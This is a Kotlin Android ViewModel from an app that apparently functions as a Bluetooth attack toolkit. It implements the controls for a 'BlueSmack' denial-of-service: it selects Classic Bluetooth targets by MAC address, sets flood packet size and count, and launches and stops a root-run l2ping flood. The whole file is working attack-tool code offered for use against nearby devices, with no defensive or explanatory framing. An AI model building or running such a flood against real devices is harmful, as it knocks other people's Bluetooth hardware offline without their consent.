package com.hereliesaz.blusnu.ui.bluesmack

import android.app.Application
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.hereliesaz.blusnu.data.ActionLogger
import com.hereliesaz.blusnu.data.BlueSmackModule
import com.hereliesaz.blusnu.data.DeviceRepository
import com.hereliesaz.blusnu.data.Protocol
import com.hereliesaz.blusnu.data.TargetDevice
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class BlueSmackViewModel(
    application: Application,
    deviceRepository: DeviceRepository,
    private val blueSmackModule: BlueSmackModule
) : AndroidViewModel(application) {

    private val _selectedDevice = MutableStateFlow<TargetDevice?>(null)
    val selectedDevice: StateFlow<TargetDevice?> = _selectedDevice

    private val _status = MutableStateFlow("")
    val status: StateFlow<String> = _status

    private val _devices = MutableStateFlow<List<TargetDevice>>(emptyList())
    val devices: StateFlow<List<TargetDevice>> = _devices.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning

    private val _packetSize = MutableStateFlow("600")
    val packetSize: StateFlow<String> = _packetSize

    private val _packetCount = MutableStateFlow("1000")
    val packetCount: StateFlow<String> = _packetCount

    private val _interfaceName = MutableStateFlow("hci0")
    val interfaceName: StateFlow<String> = _interfaceName

    private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter

    private var attackJob: Job? = null

    init {
        viewModelScope.launch {
            deviceRepository.allDevices.collect { allDevices ->
                // BlueSmack targets BR/EDR (Classic) via L2CAP. Filter out BLE-only devices.
                _devices.value = allDevices.filter {
                    it.protocol == Protocol.CLASSIC || it.protocol == Protocol.DUAL
                }
            }
        }
    }

    fun onDeviceSelected(device: TargetDevice) {
        _selectedDevice.value = device
    }

    fun onPacketSizeChanged(value: String) {
        _packetSize.value = value
    }

    fun onPacketCountChanged(value: String) {
        _packetCount.value = value
    }

    fun onInterfaceNameChanged(value: String) {
        _interfaceName.value = value
    }

    fun startAttack() {
        if (_isRunning.value) return

        val selected = _selectedDevice.value ?: return
        ActionLogger.log("BlueSmack attack started against ${selected.macAddress}.")

        if (bluetoothAdapter == null) {
            _status.value = "Bluetooth is not supported on this device"
            return
        }

        val device = try {
            bluetoothAdapter.getRemoteDevice(selected.macAddress)
        } catch (e: IllegalArgumentException) {
            _status.value = "Invalid MAC address"
            return
        }

        val size = _packetSize.value.toIntOrNull() ?: 600
        val count = _packetCount.value.toIntOrNull() ?: 1000

        _isRunning.value = true
        attackJob = viewModelScope.launch {
            try {
                _status.value = "Running l2ping flood against ${device.address}... (requires root)"
                blueSmackModule.startAttack(device.address, size, count).collect { line ->
                    _status.value = line
                }
                _status.value = "Attack finished."
            } catch (e: Exception) {
                _status.value = "Error: ${e.message}"
            } finally {
                _isRunning.value = false
            }
        }
    }

    fun stopAttack() {
        attackJob?.cancel()
        attackJob = null
        _isRunning.value = false
        viewModelScope.launch {
            withContext(Dispatchers.IO) {
                RootExecutor.execute("killall l2ping")
            }
            _status.value = "Attack stopped."
        }
    }

    override fun onCleared() {
        super.onCleared()
        attackJob?.cancel()
    }
}
